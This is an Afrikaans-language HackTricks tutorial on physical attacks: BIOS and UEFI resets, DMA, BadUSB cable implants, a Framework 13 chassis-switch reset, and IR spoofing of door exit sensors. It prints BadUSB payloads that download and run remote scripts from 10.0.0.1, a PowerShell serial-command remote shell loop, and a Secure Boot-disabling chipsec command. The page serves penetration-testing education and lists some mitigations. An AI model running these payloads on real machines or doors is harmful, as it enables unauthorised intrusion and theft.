# Fisiese Aanvalle

{{#include ../banners/hacktricks-training.md}}

## BIOS-wagwoordherstel en stelselbeveiliging

**Om die BIOS terug te stel** kan op verskeie maniere bereik word. Die meeste moederborde sluit 'n **battery** in wat, wanneer dit vir ongeveer **30 minute** verwyder word, die BIOS-instellings sal terugstel, insluitend die wagwoord. Alternatiewelik kan 'n **jumper op die moederbord** aangepas word om hierdie instellings te reset deur spesifieke penne te verbind.

Vir situasies waar hardeware-aanpassings nie moontlik of prakties is nie, bied **sagteware-instrumente** 'n oplossing. Om 'n stelsel vanaf 'n **Live CD/USB** te laat loop met distribusies soos **Kali Linux** gee toegang tot instrumente soos **_killCmos_** en **_CmosPWD_**, wat kan help met BIOS-wagwoordherstel.

In gevalle waar die BIOS-wagwoord onbekend is, sal dit gewoonlik tot 'n foutkode lei as dit **drie keer** verkeerd ingevoer word. Hierdie kode kan op webwerwe soos [https://bios-pw.org](https://bios-pw.org) gebruik word om moontlik 'n bruikbare wagwoord te herwin.

### UEFI-sekuriteit

Vir moderne stelsels wat **UEFI** in plaas van die tradisionele BIOS gebruik, kan die hulpmiddel **chipsec** gebruik word om UEFI-instellings te analiseer en te wysig, insluitend die deaktivering van **Secure Boot**. Dit kan met die volgende opdrag gedoen word:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM Analysis and Cold Boot Attacks

RAM behou data kortliks nadat krag afgeskakel is, gewoonlik vir **1 tot 2 minute**. Hierdie persistentie kan verleng word tot **10 minute** deur koue stowwe toe te pas, soos vloeibare stikstof. Gedurende hierdie verlengde periode kan 'n memory dump geskep word met gereedskap soos **dd.exe** en **volatility** vir ontleding.

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** is 'n hulpmiddel ontwerp vir fisiese geheue-manipulasie deur DMA, versoenbaar met interfaces soos **FireWire** en **Thunderbolt**. Dit maak dit moontlik om aanmeldprosedures te omseil deur die geheue te verander sodat enige wagwoord aanvaar word. Dit is egter ondoeltreffend teen **Windows 10** stelsels.

---

## Live CD/USB for System Access

Om stelsel-binaries soos **_sethc.exe_** of **_Utilman.exe_** te vervang met 'n kopie van **_cmd.exe_** kan 'n command prompt met system privileges verskaf. Gereedskap soos **chntpw** kan gebruik word om die **SAM**-lêer van 'n Windows-installasie te wysig, wat wagwoordveranderinge moontlik maak.

**Kon-Boot** is 'n hulpmiddel wat dit vergemaklik om in Windows-stelsels aan te meld sonder om die wagwoord te ken deur die Windows-kern of UEFI tydelik te wysig. Meer inligting is beskikbaar by [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Hantering van Windows-sekuriteitsfunksies

### Boot and Recovery Shortcuts

- **Supr**: Toegang tot BIOS-instellings.
- **F8**: Gaan in Recovery mode.
- Om **Shift** te druk ná die Windows-banner kan autologon omseil.

### BAD USB Devices

Toestelle soos **Rubber Ducky** en **Teensyduino** dien as platforms vir die skep van **bad USB** toerusting, wat voorafbepaalde payloads kan uitvoer wanneer dit aan 'n teikenrekenaar gekoppel word.

### Volume Shadow Copy

Administrator-privilege maak dit moontlik om kopieë van sensitiewe lêers, insluitend die **SAM**-lêer, te skep via **PowerShell**.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 gebaseerde implants soos **Evil Crow Cable Wind** verberg binne USB-A→USB-C of USB-C↔USB-C kabels, enumereer uitsluitlik as 'n USB-keyboard, en openbaar hul C2-stapel oor Wi-Fi. Die operateur hoef net die kabel van die slagoffer-host te voed, 'n hotspot met die naam `Evil Crow Cable Wind` en wagwoord `123456789` te skep, en na [http://cable-wind.local/](http://cable-wind.local/) (of die DHCP-adres) te blaai om by die ingebedde HTTP-koppelvlak uit te kom.
- Die browser-UI bied tabs vir *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, en *Config*. Gestoorde payloads word per OS getag, sleutelborduitlegte word on-the-fly omgeskakel, en VID/PID-stringe kan verander word om bekende periferie toestelle na te boots.
- Omdat die C2 binne die kabel leef, kan 'n telefoon payloads inlaai, uitvoering trigger en Wi-Fi-credentials bestuur sonder om die gasheer-OS aan te raak—ideaal vir kort-dwelling fisiese inbrake.

### OS-aware AutoExec payloads

- AutoExec-reëls bind een of meer payloads sodat hulle onmiddellik vlam vat na USB-enumerasie. Die implant voer ligte OS-fingerprinting uit en kies die ooreenstemmende script.
- Voorbeelde van 'n werkvloeistroom:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) of `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Omdat uitvoering onbewaak is, kan die eenvoudige verwisseling van 'n laaikabel 'n “plug-and-pwn” aanvanklike toegang onder die ingelogde gebruikerskonteks bewerkstellig.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** 'n stored payload open 'n console en plak 'n loop wat alles uitvoer wat op die nuwe USB serial device aankom. 'n Minimale Windows-variant is:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Die implantaat hou die USB CDC channel oop terwyl sy ESP32-S3 ’n TCP client (Python script, Android APK, or desktop executable) terug na die operateur loods. Enige bytes wat in die TCP-sessie getik word, word na die serial loop hierbo gestuur, wat remote command execution selfs op air-gapped hosts moontlik maak. Uitset is beperk, so operateurs voer tipies blind commands uit (account creation, staging additional tooling, etc.).

### HTTP OTA update surface

- Dieselfde web stack openbaar gewoonlik unauthenticated firmware updates. Evil Crow Cable Wind luister op `/update` en flits watter binary ook al opgelaai word:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Veldoperateurs kan funksies hot-swap (bv. flash USB Army Knife firmware) mid-engagement sonder om die kabel oop te maak, wat die implant toelaat om na nuwe vermoëns te skuif terwyl dit steeds aan die teikenhost gekoppel is.

## Omseil BitLocker-enkripsie

BitLocker-enkripsie kan moontlik omseil word as die **herstelsleutel** in 'n memory dump-lêer (**MEMORY.DMP**) gevind word. Gereedskap soos **Elcomsoft Forensic Disk Decryptor** of **Passware Kit Forensic** kan vir hierdie doel gebruik word.

---

## Sosiale ingenieurswese vir byvoeging van 'n herstel-sleutel

'n Nuwe BitLocker-herstelsleutel kan bygevoeg word deur sosiale-ingenieurswese-taktieke, deur 'n gebruiker te oortuig om 'n opdrag uit te voer wat 'n nuwe herstelsleutel van net nulles byvoeg, wat die ontsleutelingsproses vereenvoudig.

---

## Uitbuiting van Chassis Intrusion / Maintenance Switches om die BIOS na fabrieksinstellings te herstel

Baie moderne laptops en klein-formaat desktops het 'n **chassis-intrusion switch** wat deur die Embedded Controller (EC) en die BIOS/UEFI-firmware gemonitor word. Terwyl die primêre doel van die skakel is om 'n waarskuwing te gee wanneer 'n toestel oopgemaak word, implementeer verskaffers soms 'n **undocumented recovery shortcut** wat geaktiveer word wanneer die skakel in 'n spesifieke patroon geskuif word.

### Hoe die aanval werk

1. Die skakel is bedrade na 'n **GPIO interrupt** op die EC.
2. Firmware wat op die EC loop, hou die **tyd en aantal drukke** by.
3. Wanneer 'n hard-coded patroon herken word, roep die EC 'n *mainboard-reset*-roetine aan wat die **inhoud van die stelsel NVRAM/CMOS uitwis**.
4. By die volgende opstart laai die BIOS die standaardwaardes – **supervisor-wagwoord, Secure Boot-sleutels, en alle pasgemaakte konfigurasies word verwyder**.

> Sodra Secure Boot gedeaktiveer is en die firmware-wagwoord weg is, kan die aanvaller eenvoudig enige eksterne OS-beeld opstart en onbeperkte toegang tot die interne skywe kry.

### Werklike voorbeeld – Framework 13 Laptop

Die herstel-snelpad vir die Framework 13 (11th/12th/13th-gen) is:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Na die tiende siklus stel die EC 'n vlag wat die BIOS instrueer om NVRAM by die volgende reboot te vee. Die hele prosedure neem ~40 s en vereis **net 'n skroewedraaier**.

### Generiese Eksploitasieprosedure

1. Skakel die teiken aan of voer 'n suspend–resume uit sodat die EC loop.
2. Verwyder die onderste deksel om die inbraak-/onderhoudskakelaar bloot te lê.
3. Herhaal die vendor-spesifieke wisselpatroon (raadpleeg dokumentasie, forums, of reverse-engineer die EC-firmware).
4. Monteer weer en reboot – firmware-beskermings behoort gedeaktiveer te wees.
5. Boot 'n live USB (bv. Kali Linux) en voer die gewone post-exploitation take uit (credential dumping, data exfiltration, implanting malicious EFI binaries, ens.).

### Detectie & Mitigasie

* Log chassis-intrusion-geleenthede in die OS-bestuurskonsol en korreleer dit met onverwagte BIOS-resette.
* Gebruik **tamper-evident seals** op skroewe/deksels om opening te detecteer.
* Hou toestelle in **fisies-beheerde gebiede**; aanvaar dat fisiese toegang gelykstaan aan volledige kompromie.
* Waar beskikbaar, skakel die vendor “maintenance switch reset” funksie af of vereis 'n addisionele cryptografiese authorisasie vir NVRAM-resette.

---

## Geheime IR-inspuiting teen No-Touch-uitgangssensors

### Sensor Kenmerke
- Gewone “wave-to-exit” sensors koppel 'n near-IR LED emitter aan 'n TV-remote-styl ontvangermodule wat net 'n logic high rapporteer nadat dit meerdere pulse (~4–10) van die korrekte carrier (≈30 kHz) gesien het.
- 'n Plastiek skerm blokkeer die emitter en ontvanger om direk na mekaar te kyk, dus aanvaar die controller dat enige gevalideerde carrier van 'n nabygeleë weerkaatsing kom en dryf 'n relay wat die deurstrike oopmaak.
- Sodra die controller glo 'n teiken is teenwoordig, verander dit dikwels die uitgaande modulasiemantel, maar die ontvanger bly enige burst aanvaar wat by die gefilterde carrier pas.

### Aanvalswerkvloei
1. **Vasvang die emissieprofiel** – klem 'n logic analyser oor die controller-penne om beide die pre-detection en post-detection golfvorms wat die interne IR LED aandryf, op te neem.
2. **Replay slegs die “post-detection” golfvorm** – verwyder/ignoreer die stock emitter en drive 'n eksterne IR LED met die reeds-getriggerde patroon van die begin af. Omdat die ontvanger net om pulse-aantal/frekwensie gee, behandel dit die spoofed carrier as 'n egte weerkaatsing en stel die relay-lijn aktief.
3. **Gate die transmissie** – stuur die carrier in gesmede bursts (bv. tientalle millisekondes aan, soortgelyk af) om die minimum pulse-aantal te lewer sonder om die ontvanger se AGC of interferensiehanteringslogika te versadig. Deurlopende emissie ontsensitiseer die sensor vinnig en keer dat die relay afvuur.

### Langafstand Weerkaatsende Inspuiting
- Die vervanging van die bench LED met 'n hoë-krag IR-diode, MOSFET-driver, en fokusoptika maak betroubare triggering vanaf ~6 m moontlik.
- Die aanvaller het nie 'n line-of-sight na die ontvangerapertuur nodig nie; rig die straal op binnemure, rakke, of deurraamwerk wat deur glas sigbaar is laat weerkaatste energie die ~30° sigveld binnekom en 'n kortafstand-handwave naboots.
- Omdat die ontvangers net swak weerkaatsings verwag, kan 'n veel sterker eksterne straal van meerdere oppervlaktes weerkaats en steeds oor die detectiedrempel bly.

### Wapeniseerde Aanvalstoorts
- Inbedding van die driver binne 'n kommersiële flitslig verberg die hulpmiddel in die openbaar. Vervang die sigbare LED met 'n hoë-krag IR LED wat by die ontvanger se band pas, voeg 'n ATtiny412 (of soortgelyk) by om die ≈30 kHz bursts te genereer, en gebruik 'n MOSFET om die LED-stroom te sink.
- 'n Telescopiese zoom-lens versnoer die straal vir bereik/precisie, terwyl 'n vibrasiemotor onder MCU-beheer haptiese bevestiging gee dat modulering aktief is sonder om sigbare lig uit te straal.
- Deur deur verskeie gestoor modulasiemodusse te skuif (effens verskillende carrier-frekwensies en envelopes) verhoog kompatibiliteit oor gerebrande sensorfamilies, wat die operateur toelaat om weerkaatsende oppervlaktes te sweip totdat die relay hoorbaar klik en die deur vrylaat.

---

## Verwysings

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
